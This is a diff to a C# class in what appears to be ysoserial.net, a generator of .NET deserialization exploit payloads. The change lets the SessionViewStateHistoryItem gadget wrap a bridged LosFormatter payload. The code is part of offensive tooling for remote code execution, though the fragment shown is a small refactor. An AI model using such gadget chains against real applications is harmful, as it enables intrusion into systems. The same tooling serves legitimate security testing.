@@ -30,6 +30,11 @@ namespace ysoserial.Generators
             return new List<string> { GadgetTypes.BridgeAndDerived };
         }
 
+        public override string SupportedBridgedFormatter()
+        {
+            return Formatters.LosFormatter;
+        }
+
         private string GetB64SessionToken(string b64encoded)
         {
             var obj = new SessionViewStateHistoryItemMarshal(b64encoded);
@@ -41,8 +46,18 @@ namespace ysoserial.Generators
 
         public override object Generate(string formatter, InputArgs inputArgs)
         {
-            IGenerator generator = new TextFormattingRunPropertiesGenerator();
-            string losFormatterText = Encoding.UTF8.GetString((byte[])generator.GenerateWithNoTest("LosFormatter", inputArgs));
+            byte[] losFormatterPayload;
+            if (BridgedPayload != null)
+            {
+                losFormatterPayload = (byte[])BridgedPayload;
+            }
+            else
+            {
+                IGenerator generator = new TextFormattingRunPropertiesGenerator();
+                losFormatterPayload = (byte[])generator.GenerateWithNoTest("LosFormatter", inputArgs);
+            }
+
+            string losFormatterText = Encoding.UTF8.GetString(losFormatterPayload);
 
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
